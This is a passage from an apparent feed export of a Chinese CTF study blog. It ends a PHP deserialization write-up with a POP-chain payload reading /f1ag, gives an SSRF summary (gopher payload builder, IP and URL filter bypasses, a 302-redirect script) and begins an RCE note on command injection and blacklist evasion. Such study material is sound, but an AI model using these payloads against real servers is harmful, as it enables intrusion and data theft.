class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;daniu=<span class="hljs-string">&quot;I&#x27;m daniu.&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;robot=<span class="hljs-string">&quot;I&#x27;m robot.&quot;</span>;<br>                <span class="hljs-variable language_">$this</span>-&gt;notrobot=<span class="hljs-string">&quot;I&#x27;m not a robot.&quot;</span>;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$funName</span>, <span class="hljs-variable">$arguments</span></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu.<span class="hljs-variable">$funName</span>.<span class="hljs-string">&quot;not exists!!!&quot;</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu;<br>            <span class="hljs-variable language_">$this</span>-&gt;daniu=<span class="hljs-variable language_">$this</span>-&gt;robot;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$robot</span>=<span class="hljs-variable language_">$this</span>-&gt;robot;<br>            <span class="hljs-variable language_">$this</span>-&gt;daniu-&gt;<span class="hljs-variable">$robot</span>=<span class="hljs-variable language_">$this</span>-&gt;notrobot;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>)<span class="hljs-variable language_">$this</span>-&gt;daniu;<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;daniu.<span class="hljs-variable">$key</span>.<span class="hljs-string">&quot;not exists!!!&quot;</span>;<br>        &#125;<br><br> &#125;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Year</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$zodiac</span>;<br>         <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;happy &quot;</span>.<span class="hljs-variable language_">$this</span>-&gt;zodiac.<span class="hljs-string">&quot; year!&quot;</span>;<br><br>        &#125;<br>         <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;zodiac=<span class="hljs-string">&quot;Hu&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>                <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">show</span>();<br><br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)#3</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">show</span>(<span class="hljs-params"></span>)</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;zodiac));<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;zodiac = <span class="hljs-string">&#x27;hu&#x27;</span>;<br>        &#125;<br><br>    &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先构造pop链<br><code>O:5:&quot;Happy&quot;:1:&#123;s:5:&quot;happy&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:5:&quot;_New_&quot;:3:&#123;s:5:&quot;daniu&quot;;O:4:&quot;Year&quot;:1:&#123;s:6:&quot;zodiac&quot;;N;&#125;s:5:&quot;robot&quot;;s:6:&quot;zodiac&quot;;s:8:&quot;notrobot&quot;;s:5:&quot;/f1ag&quot;;&#125;s:5:&quot;robot&quot;;N;s:8:&quot;notrobot&quot;;N;&#125;&#125;</code></p><p>看下phpinfo中关于session的信息，可以知道当前index.php用的是<code>php</code>引擎，其他页面默认用<code>php_serialize</code>引擎，且<code>session.upload_progress.cleanup=Off</code>，意味着php不会立即清空对应的session文件，就不用进行条件竞争</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-4.png"></p><p>构造<code>POST</code>表单，提交传入序列化字符串</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://dece2f58-5f4b-4bd0-904a-ac58efcf9623.challenges.ctfer.com:8080/&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;lewiserii&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br></code></pre></td></tr></table></figure><p>因为要放到<code>filename</code>中的双引号中，所以这里要转义一下双引号，在拼接上<code>|</code>，注意一定要带上<code>PHPSESSID</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/unserialize/unserialize-5.png"></p><blockquote><p>伪造PHP_SESSION_UPLOAD_PROGRESS的值时，值中一旦出现|，将会导致数据写入session文件失败，所以用filename</p></blockquote><hr><p>参考文章:<br><a href="https://blog.csdn.net/mochu7777777/article/details/106909777">由浅入深理解PHP反序列化漏洞</a><br><a href="https://blog.csdn.net/solitudi/article/details/113588692">[CTF]PHP反序列化总结</a><br><a href="https://spaceman-911.gitee.io/2021/06/30/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E8%B6%85%E7%BB%86%E7%9A%84%EF%BC%89/">PHP-反序列化（超细的）</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;常见的魔术方法&quot;&gt;&lt;a href=&quot;#常见的魔术方法&quot; class=&quot;headerlink&quot; title=&quot;常见的魔术方法&quot;&gt;&lt;/a&gt;常见的魔术方法&lt;/h1&gt;&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;g</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="php" scheme="https://www.lewiserii.top/tags/php/"/>
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
    <category term="反序列化" scheme="https://www.lewiserii.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>ssrf学习总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/ssrf%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/ssrf%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93.html</id>
    <published>2023-02-05T04:00:00.000Z</published>
    <updated>2023-03-12T08:59:34.593Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ssrf"><a href="#ssrf" class="headerlink" title="ssrf"></a>ssrf</h1><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p><h1 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h1><p>下面是几个可能会存在SSRF的服务器使用的函数：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">file_get_contents()：将整个文件或一个url所指向的文件读入一个字符串中。<br>readfile()：输出一个文件的内容。<br>fsockopen()：打开一个网络连接或者一个Unix 套接字连接。<br>curl_exec()：初始化一个新的会话，返回一个cURL句柄，供curl_setopt()，curl_exec()和curl_close() 函数使用。<br>fopen()：打开一个文件文件或者 URL。<br></code></pre></td></tr></table></figure><p>example:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$url</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-variable">$ch</span>=<span class="hljs-title function_ invoke__">curl_init</span>(<span class="hljs-variable">$url</span>);  <span class="hljs-comment">//创造一个curl资源</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>); <span class="hljs-comment">//设置url和相应的选项</span><br><span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);<br><span class="hljs-variable">$result</span>=<span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">// 抓取url并将其传递给浏览器</span><br><span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$ch</span>); <span class="hljs-comment">//关闭curl资源</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-variable">$result</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="常用协议"><a href="#常用协议" class="headerlink" title="常用协议"></a>常用协议</h1><h2 id="http"><a href="#http" class="headerlink" title="http"></a>http</h2><p>http协议用于访问内网资源&#x2F;扫描内网存活主机</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-1.png"></p><h2 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h2><p>可以通过dict协议根据响应时间和内容去扫描内网开放端口以及端口上运行的服务信息</p><p>example:<br><code>dict://127.0.0.1:6379 //探测redis是否存活</code></p><h2 id="file"><a href="#file" class="headerlink" title="file"></a>file</h2><p>file协议主要用于访问本地计算机的文件，在有回显的情况下，可以用于读取文件进行查看</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-2.png"></p><h2 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h2><p>格式：<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_&lt;TCP数据流&gt;</code></p><p>如果发起<code>post</code>请求，回车换行需要使用<code>%0d%0a</code>，如果多个参数，参数之间的<code>&amp;</code>也需要进行<code>URL</code>编码</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/ssrf/ssrf-3.png"></p><p>通过脚本转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.parse<br>payload =\<br><span class="hljs-string">&quot;&quot;&quot;POST /test.php HTTP/1.1</span><br><span class="hljs-string">Host: 127.0.0.1</span><br><span class="hljs-string">Content-Type: application/x-www-form-urlencoded</span><br><span class="hljs-string">Content-Length: 36</span><br><span class="hljs-string"></span><br><span class="hljs-string">test=1</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment">#注意后面一定要有回车，回车结尾表示http请求结束</span><br>tmp = urllib.parse.quote(payload)<br>new = tmp.replace(<span class="hljs-string">&#x27;%0A&#x27;</span>,<span class="hljs-string">&#x27;%0D%0A&#x27;</span>)<br>result = <span class="hljs-string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="hljs-string">&#x27;_&#x27;</span>+new<br>result = urllib.parse.quote(result)<br><span class="hljs-built_in">print</span>(result)       <span class="hljs-comment"># 这里因为是GET请求所以要进行两次url编码</span><br></code></pre></td></tr></table></figure><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>攻击内网<code>Redis</code>，<code>FastCGI</code>，<code>MySql</code>等服务</p><p><a href="https://xz.aliyun.com/t/5665">浅析Redis中SSRF的利用</a></p><p>利用<a href="https://github.com/tarunkant/Gopherus">Gopherus</a>工具</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">MySQL (Port-3306)<br>PostgreSQL(Port-5432)<br>FastCGI (Port-9000)<br>Memcached (Port-11211)<br>    If stored data is getting De-serialized by:<br>        Python<br>        Ruby<br>        PHP<br>Redis (Port-6379)<br>Zabbix (Port-10050)<br>SMTP (Port-25)<br></code></pre></td></tr></table></figure><h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><h2 id="ip限制"><a href="#ip限制" class="headerlink" title="ip限制"></a>ip限制</h2><p>例如限制了<code>127/172</code></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">进制转换<br>10进制 http://2130706433<br>8进制 http://017700000001<br>16进制  http://0x7F000001<br><br>长度限制<br>host&lt;5<br>url=http://0/flag.php<br>url=http://127.1/flag.php<br><br>host&lt;3<br>url=http://0/flag.php  //在window下代表0.0.0.0，而在liunx下代表127.0.0.1<br></code></pre></td></tr></table></figure><h2 id="url限制"><a href="#url限制" class="headerlink" title="url限制"></a>url限制</h2><blockquote><p>解析到内网的域名</p></blockquote><p><code>xip.io</code>、<code>xip.name</code>、<code>nip.io</code>、<code>sslip.io</code>等</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">192.168.0.1.xip.io &gt;&gt;&gt; 192.168.0.1<br>localhost &gt;&gt;&gt; 127.0.0.1<br></code></pre></td></tr></table></figure><blockquote><p>利用@转跳</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://www.baidu.com@10.10.10.10 &gt;&gt;&gt; http://10.10.10.10<br></code></pre></td></tr></table></figure><blockquote><p>利用句号</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">127。0。0。1  &gt;&gt;&gt;  127.0.0.1<br></code></pre></td></tr></table></figure><blockquote><p>利用IPv6[::]</p></blockquote><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1<br>http://[0:0:0:0:0:ffff:127.0.0.1]/    //在liunx下可用<br></code></pre></td></tr></table></figure><blockquote><p>利用短网址</p></blockquote><p>不允许出现某个字母或者限制了url长度，我们可以切换为短网址，来绕过长度的限制</p><h2 id="302跳转"><a href="#302跳转" class="headerlink" title="302跳转"></a>302跳转</h2><p>vps上放个php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location:http://127.0.0.1/flag.php&quot;</span>);<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$schema</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-variable">$ip</span>     = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;i&#x27;</span>];<br><span class="hljs-variable">$port</span>   = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;p&#x27;</span>];<br><span class="hljs-variable">$query</span>  = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;q&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$port</span>))&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>/<span class="hljs-subst">$query</span>&quot;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$schema</span>://<span class="hljs-subst">$ip</span>:<span class="hljs-subst">$port</span>/<span class="hljs-subst">$query</span>&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="enclosed-alphanumerics-绕过"><a href="#enclosed-alphanumerics-绕过" class="headerlink" title="enclosed alphanumerics 绕过"></a>enclosed alphanumerics 绕过</h2><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com<br>List:<br>① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ  Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿<br></code></pre></td></tr></table></figure><h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p><a href="https://xz.aliyun.com/t/7495">从0到1认识DNS重绑定攻击</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ssrf&quot;&gt;&lt;a href=&quot;#ssrf&quot; class=&quot;headerlink&quot; title=&quot;ssrf&quot;&gt;&lt;/a&gt;ssrf&lt;/h1&gt;&lt;p&gt;服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，</summary>
      
    
    
    
    <category term="总结" scheme="https://www.lewiserii.top/categories/%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="ssrf" scheme="https://www.lewiserii.top/tags/ssrf/"/>
    
    <category term="总结" scheme="https://www.lewiserii.top/tags/%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>RCE总结</title>
    <link href="https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/RCE%E6%80%BB%E7%BB%93.html"/>
    <id>https://www.lewiserii.top/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/RCE%E6%80%BB%E7%BB%93.html</id>
    <published>2023-01-10T04:00:00.000Z</published>
    <updated>2023-02-15T05:17:36.769Z</updated>
    
    <content type="html"><![CDATA[<p>部分题目环境&amp;脚本&amp;姿势来自<code>https://ctf.show/</code></p><h1 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h1><h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><p>主要有6种函数可以执行系统命令，分别是<code>system</code>,<code>passthru</code>,<code>exec</code>,<code>shell_exec</code>,<code>popen</code>,<code>pcntl_exec</code></p><h2 id="命令执行利用"><a href="#命令执行利用" class="headerlink" title="命令执行利用"></a>命令执行利用</h2><h3 id="参数值可控"><a href="#参数值可控" class="headerlink" title="参数值可控"></a>参数值可控</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;ls &quot;</span>.<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>直接用<code>;</code>将命令分割成两部分执行</p><p>或者用<code>&amp;&amp;</code>和<code>||</code><br><code>&amp;&amp;</code>表示前一条命令执行成功时，才执行后一条命令<br><code>||</code>表示上一条命令执行失败后，才执行下一条命令</p><h3 id="命令可控"><a href="#命令可控" class="headerlink" title="命令可控"></a>命令可控</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);<br></code></pre></td></tr></table></figure><p>与上题类似</p><h3 id="其他方式跳出控制范围"><a href="#其他方式跳出控制范围" class="headerlink" title="其他方式跳出控制范围"></a>其他方式跳出控制范围</h3><p><code>cd /%0apwd</code> 相当于依次执行命令<code>cd /</code>和<code>pwd</code></p><h3 id="整体可控"><a href="#整体可控" class="headerlink" title="整体可控"></a>整体可控</h3><h4 id="黑名单过滤"><a href="#黑名单过滤" class="headerlink" title="黑名单过滤"></a>黑名单过滤</h4><p>比赛中较为常见的一种类型，将关键词替换成空或其他字符<br>如果只替换成空可以利用双写绕过，如果是替换成字符那么可以用base64编码绕过或者拼接变量</p><p>常见的读取文件的命令：<code>cat</code>,<code>tac</code>,<code>od</code>,<code>nl</code>,<code>less</code>,<code>more</code>,<code>sed p</code>,<code>head</code>,<code>tail</code>,<code>sort</code>,<code>uniq</code>,<code>file -f</code><br>常见的列目录的命令：<code>ls</code>,<code>du</code><br>常用的还有通配符<code>*</code>和<code>?</code></p><p>黑名单还可以采用一些不影响执行的特定符号隔开检测的关键字</p><p>比如<br><code>cat /flag</code>–&gt;<code>ca&#39;&#39;t /flag</code>–&gt;<code>ca&quot;&quot;t /flag</code>–&gt;<code>ca\t /flag</code>–&gt;<code>ca$1t /flag</code>–&gt;<code>ca$IFS$1t /flag</code></p><h4 id="符号过滤"><a href="#符号过滤" class="headerlink" title="符号过滤"></a>符号过滤</h4><p>符号过滤也非常常见</p><p>比如可以用<code>&lt;&gt;</code>,<code>$&#123;IFS&#125;</code>,<code>$IFS$9</code>,<code>%09</code>,<code>%0b</code>,<code>%0c</code>等代替空格</p><p>再者，可以利用变量来截取</p><p>比如通过<code>env</code>命令获取到了如下变量</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">PHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data --disable-cgi<br>USER=www-data<br>HOSTNAME=f3f5c6c3e3ee<br>PHP_INI_DIR=/usr/local/etc/php<br>SHLVL=2<br>HOME=/home/www-data<br>PHP_LDFLAGS=-Wl,-O1 -pie<br>PHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64<br>PHP_MD5=<br>PHP_VERSION=7.3.22<br>GPG_KEYS=CBAF69F173A0FEA4B537F470D66C9593118BCCB6 F38252826ACD957EF380D39F2F7956BC5DA04B5D<br>PHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64<br>PHP_ASC_URL=https://www.php.net/distributions/php-7.3.22.tar.xz.asc<br>PHP_URL=https://www.php.net/distributions/php-7.3.22.tar.xz<br>PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin<br>PHPIZE_DEPS=autoconf dpkg-dev dpkg file g++ gcc libc-dev make pkgconf re2c<br>PWD=/var/www/html<br>PHP_SHA256=0e66606d3bdab5c2ae3f778136bfe8788e574913a3d8138695e54d98562f1fb5<br>FLAG=not_flag<br></code></pre></td></tr></table></figure><p>可以通过<code>$&#123;PHPIZE_DEPS:9:1&#125;</code>或者<code>$&#123;PHP_EXTRA_CONFIGURE_ARGS:12:1&#125;</code>表示空格</p><h3 id="无字母数字命令执行"><a href="#无字母数字命令执行" class="headerlink" title="无字母数字命令执行"></a>无字母数字命令执行</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span 